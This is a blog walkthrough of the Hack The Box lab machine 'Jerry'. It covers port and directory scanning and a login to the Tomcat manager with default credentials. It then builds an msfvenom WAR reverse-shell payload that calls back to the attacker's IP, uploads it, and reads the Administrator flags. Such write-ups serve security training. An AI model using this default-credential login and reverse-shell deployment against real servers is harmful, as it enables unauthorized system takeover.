---
"title": "Hack The Box - Jerry"
"date": 2020-04-20
"tags": ["windows", "easy", "tomcat"]
"keywords": ["windows", "easy", "tomcat"]
"author": "Ghostbyt3"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Writeup"
---



![694398c04fbbb4b4c6b507180ee3fb06.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/70f494906c3d48118c3b9a09dc3e7620.png)

We are going to pwn Jerry from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/144](https://www.hackthebox.eu/home/machines/profile/144)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

## HTTP:

Only HTTP Port is open, and its running `Tomcat` service and its version is `7.0.88`. We get the default tomcat configuration page.


![679f2e5cfa08b4e9f4bbcebeed0010af.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/763886848f9a45c6aac20183903457fe.png)


## Gobuster Results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.95:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/20 10:22:14 Starting gobuster
===============================================================
/aux (Status: 200)
/com1 (Status: 200)
/com2 (Status: 200)
/com3 (Status: 200)
/con (Status: 200)
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/host-manager (Status: 302)
/lpt1 (Status: 200)
/lpt2 (Status: 200)
/manager (Status: 302)
===============================================================
2020/04/20 10:24:23 Finished
===============================================================
```

`/manager`
There is a login page for manager.So let’s try to access it .
![a0986527fad314f30d5833f4792350ad.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/76e47a71750346bbadcb1f91634d868f.png)
The default login credentials for Tomcat. You can get [here](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown).

Logged in successfully with `tomcat : s3cret`


![adeb7712828d540a6af85e0050add2d8.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/2c7cfa06a42540c8ad26bc835670ba73.png)

Here we can see the information about the box.


![1163529f91334808e8417d5e61f4825f.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/af8940be7c0141c4a88476e5b0ca0925.png)

There is a option to upload `WAR` files.


![ea70bbc644929d40c4fdc22a7bdcb11c.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/e12823f25b6d4e80a75bab9783e40150.png)

> WAR file is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages and other resources that together constitute a web application.

We can use `msfvenom` for generating a `.war` format payload.
```
root@w0lf:~/CTF/HTB/Boxes/Jerry# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war > shell.war
Payload size: 1088 bytes
Final size of war file: 1088 bytes
```
## Getting Shell:


![1f6a90af94b8fa8eb5ec47af6aa16476.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/27cfc16afbfa4949aac984950183cbaf.png)

The file name is `shell.war` so I can access it as `/shell`

![46508d9cfbb7f76846acbd7434f520bf.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-jerry/a779bab5194b478c98de5c4e91c7da8f.png)

```
C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator

06/18/2018  11:31 PM    [DIR](DIR)          .
06/18/2018  11:31 PM    [DIR](DIR)          ..
06/19/2018  06:43 AM    [DIR](DIR)          Contacts
06/19/2018  07:09 AM    [DIR](DIR)          Desktop
06/19/2018  06:43 AM    [DIR](DIR)          Documents
06/19/2018  06:43 AM    [DIR](DIR)          Downloads
06/19/2018  06:43 AM    [DIR](DIR)          Favorites
06/19/2018  06:43 AM    [DIR](DIR)          Links
06/19/2018  06:43 AM    [DIR](DIR)          Music
06/19/2018  06:43 AM    [DIR](DIR)          Pictures
06/19/2018  06:43 AM    [DIR](DIR)          Saved Games
06/19/2018  06:43 AM    [DIR](DIR)          Searches
06/19/2018  06:43 AM    [DIR](DIR)          Videos
               0 File(s)              0 bytes
              13 Dir(s)  27,602,595,840 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    [DIR](DIR)          .
06/19/2018  07:09 AM    [DIR](DIR)          ..
06/19/2018  07:09 AM    [DIR](DIR)          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,602,595,840 bytes free
               
C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    [DIR](DIR)          .
06/19/2018  07:09 AM    [DIR](DIR)          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,602,595,840 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
70----------------------------00

root.txt
04----------------------------0e
               

```
